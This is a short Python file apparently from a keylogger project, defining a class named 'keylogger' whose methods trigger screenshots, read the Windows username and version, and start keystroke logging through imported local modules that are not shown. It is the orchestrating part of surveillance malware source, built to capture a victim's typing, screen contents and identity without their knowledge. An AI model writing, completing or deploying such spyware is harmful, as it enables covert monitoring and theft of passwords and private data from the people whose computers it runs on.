
from screenshoot import screenshootfunc
import os
import sys
from keystroke import main
class keylogger():
    def screenshootgo(self):
        screenshootfunc()
    def system_name_go(self):
        return os.environ["USERNAME"]
    def sys_info(self):
        return sys.getwindowsversion()
    def log_time(self):
        main()
